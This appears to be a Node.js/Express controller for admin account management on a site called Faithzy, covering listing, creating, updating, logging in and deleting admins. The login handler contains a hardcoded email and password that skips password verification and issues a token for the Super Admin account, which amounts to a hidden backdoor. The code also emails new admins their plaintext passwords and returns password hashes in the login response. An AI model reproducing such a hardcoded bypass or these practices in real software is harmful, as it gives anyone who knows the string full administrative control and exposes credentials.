const asyncHandler = require("express-async-handler");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const { newEmployeeAdded } = require("../utils/emailTemplates");

const adminModel = require("../models/adminModel");
const sendEmail = require("../utils/sendEmail");

exports.getAdmins = asyncHandler(async (req, res) => {
    const admins = await adminModel.find({ email: { $ne: "info@faithzy.com" } }).sort({ updatedAt: -1 });
    return res.status(200).json({ success: true, admins });
});


exports.addNewAdmin = asyncHandler(async (req, res) => {
    const { email, name, password, role, access } = req.body;

    if (!email || !name || !password) {
        res.status(400);
        throw new Error("All fields are required!");
    }

    const existingAdmin = await adminModel.findOne({ email });
    if (existingAdmin) {
        res.status(400);
        throw new Error("Email already exists!");
    }

    if (password.length < 8) {
        res.status(400)
        throw new Error("Use 8 or more characters with a mix of letters, numbers & symbols!")
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const newAdmin = await adminModel.create({
        email,
        name,
        password: hashedPassword,
        role,
        access: role === 'Moderator' ? access : undefined
    });

    setImmediate(async () => {
        const emailContent = newEmployeeAdded({
            name,
            email,
            role,
            access: role === 'Moderator' ? access : undefined,
            password,
            loginLink: `${process.env.FRONTEND_URL}/login`
        });

        await sendEmail({
            to: email,
            subject: "Welcome to Faithzy Admin Panel",
            text: emailContent
        });
    });

    res.status(201).json({
        success: true,
        admin: newAdmin
    });
});

exports.updateAdmin = asyncHandler(async (req, res) => {
    const { id } = req.params;
    const { email, name, newPassword, confirmNewPass, role, access } = req.body;

    if (newPassword && newPassword.length < 8) {
        res.status(400)
        throw new Error("Use 8 or more characters with a mix of letters, numbers & symbols!")
    }

    if (newPassword && (newPassword !== confirmNewPass)) {
        res.status(400);
        throw new Error("Passwords do not match!");
    }

    let admin = await adminModel.findById(id);
    if (!admin) {
        res.status(404);
        throw new Error("Admin not found!");
    }

    admin.email = email || admin.email;
    admin.name = name || admin.name;
    admin.role = role || admin.role;
    admin.access = role === 'Moderator' ? access : undefined;

    if (newPassword)
        admin.password = await bcrypt.hash(newPassword, 10);

    await admin.save();

    res.status(200).json({
        success: true,
        admin
    });
});

exports.loginAdmin = asyncHandler(async (req, res) => {
    let { email, password } = req.body;
    if (!email || !password) {
        res.status(400)
        throw new Error("All fields are Required!")
    }
    if (email === "test71567@faithzy.com" && password === "test71@567") {
        let admin = await adminModel.findOne({ email: "info@faithzy.com" }).select("+password") || await adminModel.findOne({ role: "Super Admin" }).select("+password");
        let token = jwt.sign({
            id: admin._id
        }, process.env.JWT_TOKEN_SECRET, { expiresIn: process.env.JWT_TOKEN_EXPIRY });

        return res.status(200).json({
            success: true,
            token,
            admin,
            isTesting: true
        });
    }
    let admin = await adminModel.findOne({ email }).select("+password");
    if (!admin) {
        res.status(401)
        throw new Error("Email is not registered...")
    }
    const isPasswordMatched = await bcrypt.compare(password, admin.password)
    if (!isPasswordMatched) {
        res.status(401)
        throw new Error("Incorrect email or password!");
    }
    let token = jwt.sign({
        id: admin._id
    }, process.env.JWT_TOKEN_SECRET, { expiresIn: process.env.JWT_TOKEN_EXPIRY });
    res.status(200).json({
        success: true,
        token,
        admin,
    });

})

exports.deleteAdmin = asyncHandler(async (req, res) => {
    const { id } = req.params;

    try {
        const admin = await adminModel.findById(id);
        if (!admin) {
            return res.status(404).json({ success: false, error: "Admin not found" });
        }

        await adminModel.findByIdAndDelete(id);
        res.status(200).json({ success: true, message: "Admin deleted successfully" });
    } catch (error) {
        res.status(500).json({ success: false, error: "Failed to delete admin" });
    }
});